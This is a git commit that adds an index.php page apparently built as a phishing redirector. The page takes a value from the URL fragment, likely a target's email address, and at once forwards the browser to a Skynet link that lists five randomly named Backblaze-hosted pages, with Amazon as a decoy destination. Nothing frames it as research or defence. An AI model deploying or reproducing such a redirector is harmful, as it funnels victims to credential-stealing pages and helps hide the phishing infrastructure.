97ac7d4eb5073b268b7a22970a4d80ae62586c8c
siganls212 <114506423+siganls212@users.noreply.github.com>
2022-09-29 07:46:29 -0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,25 @@
+<html lang="en">
+	<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
+	<script>
+		function makeid(length) {
+			var result = "";
+			var characters =
+				"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+			var charactersLength = characters.length;
+			for (var i = 0; i < length; i++) {
+				result += characters.charAt(
+					Math.floor(Math.random() * charactersLength)
+				);
+			}
+			return result;
+		}
+
+		var hash = window.location.hash;
+		var str = hash.split("#")[1];
+		var em = hash.split("#")[1];
+
+		window.setTimeout(function () {
+			window.location.href = "https://siasky.net/DACoHNSnvEPhIzE9Mw_TVU6L76tIqxGWPSM4nOwaU8K8wg?key=c8a3fadf8d0869a204b3cf7669d91e740522b6d8&url_01=https://deino-hullos-pachypodous.s3.eu-central-003.backblazeb2.com/index.html&url_02=https://deglycerin-parachromatopsia-pelicanry.s3.eu-central-003.backblazeb2.com/index.html&url_03=https://hagger-promulging-unmourned.s3.eu-central-003.backblazeb2.com/index.html&url_04=https://christiania-gragers-pelorized.s3.eu-central-003.backblazeb2.com/index.html&url_05=https://heterosuggestion-sympode-teazled.s3.eu-central-003.backblazeb2.com/index.html&redirect=https://www.amazon.com"+  + em;
+		}, 0);
+	</script>
+</html>
